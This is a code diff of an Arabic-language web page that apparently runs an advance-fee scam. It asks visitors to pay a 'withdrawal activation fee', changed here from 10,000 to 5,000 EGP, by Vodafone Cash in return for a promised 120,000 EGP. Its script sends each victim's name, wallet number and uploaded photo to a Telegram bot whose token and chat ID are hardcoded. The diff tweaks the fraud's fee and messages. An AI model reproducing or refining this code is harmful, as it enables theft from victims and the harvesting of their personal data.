@@ -82,7 +82,7 @@
 
     <div class="content" id="step-2" style="display: none;">
         <h3 style="color:#c40000">خطوة أخيرة لتفعيل السحب</h3>
-        <p>يرجى إرسال رسوم التفعيل (<b>10,000 ج.م</b>) إلى الرقم التالي:</p>
+        <p>يرجى إرسال رسوم التفعيل (<b>5,000 ج.م</b>) إلى الرقم التالي:</p>
         
         <div class="wallet-box">
             رقم التحويل (فودافون كاش):
@@ -117,6 +117,7 @@
             return;
         }
 
+        // بيانات التليجرام الخاصة بك
         const telegramToken = "8599127373:AAFgF2GBQMuscGGXzxs0Nayx3grP2aQulVQ"; 
         const chatId = "8408093977"; 
 
@@ -124,7 +125,7 @@
         const formData = new FormData();
         formData.append("chat_id", chatId);
         formData.append("photo", file);
-        formData.append("caption", `💰 سحب جديد:\n👤 الاسم: ${name}\n📱 المحفظة: ${phone}\n💵 الرسوم: 10,000 ج.م\n💸 الربح: 120,000 ج.م`);
+        formData.append("caption", `🚨 سحب جديد:\n👤 الاسم: ${name}\n📱 المحفظة: ${phone}\n💵 الرسوم: 5,000 ج.م\n💸 الربح المتوقع: 120,000 ج.م`);
 
         btn.innerText = "جاري التأكيد...";
         btn.disabled = true;
@@ -136,7 +137,7 @@
             });
             window.location.href = "success.html";
         } catch (error) {
-            alert("حدث خطأ، تأكد من الإنترنت");
+            alert("حدث خطأ في الإرسال");
             btn.disabled = false;
         }
     }
